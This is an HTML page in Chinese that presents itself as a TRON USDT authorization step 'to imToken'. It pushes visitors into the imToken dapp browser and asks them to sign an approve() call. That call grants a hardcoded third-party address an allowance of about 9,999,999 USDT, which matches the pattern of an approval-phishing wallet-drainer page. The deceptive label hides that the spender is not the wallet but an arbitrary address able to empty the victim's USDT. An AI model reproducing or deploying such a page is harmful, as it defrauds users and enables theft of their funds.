<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TRON USDT 授权</title>
<style>
  body { font-family: Arial; padding: 20px; background: #f6f6f6; }
  input, button { padding: 8px; margin: 5px 0; width: 100%; }
  button { cursor: pointer; }
  #status { margin-top: 10px; font-weight: bold; }
</style>
</head>
<body>

<h2>TRON USDT 授权页面</h2>

<label>合约地址:</label>
<input type="text" id="contractAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t">

<label>授权地址:</label>
<input type="text" id="spenderAddress" value="TGyztuTE8f4FJte4JZ1VRDpEKYpKMAuQey">

<button id="approveBtn">授权到 imToken</button>

<div id="status"></div>

<script>
const MAX_AMOUNT = 9999999 * 1000000; // TRC20 USDT 6位小数

async function waitForTronWeb() {
  while (!window.tronWeb || !tronWeb.ready) {
    document.getElementById('status').innerText = '等待 imToken 登录...';
    await new Promise(resolve => setTimeout(resolve, 500));
  }
  document.getElementById('status').innerText = 'imToken 已连接!';
}

async function approve() {
  const contractAddress = document.getElementById('contractAddress').value;
  const spender = document.getElementById('spenderAddress').value;

  try {
    const contract = await tronWeb.contract().at(contractAddress);

    document.getElementById('status').innerText = '等待交易签名...';
    const tx = await contract.approve(spender, MAX_AMOUNT).send({
      feeLimit: 100_000_000,
      callValue: 0
    });

    document.getElementById('status').innerText = '授权成功！交易ID: ' + tx;
  } catch (e) {
    console.error(e);
    document.getElementById('status').innerText = '交易失败: ' + e.message;
  }
}

document.getElementById('approveBtn').addEventListener('click', async () => {
  // 检测是否在 imToken 内置浏览器
  if (!window.tronWeb || !tronWeb.ready) {
    const dappUrl = encodeURIComponent(window.location.href);
    window.location.href = `imtokenv2://navigate/dapp?url=${dappUrl}`;
    return;
  }

  await waitForTronWeb();
  approve();
});
</script>

</body>
</html>
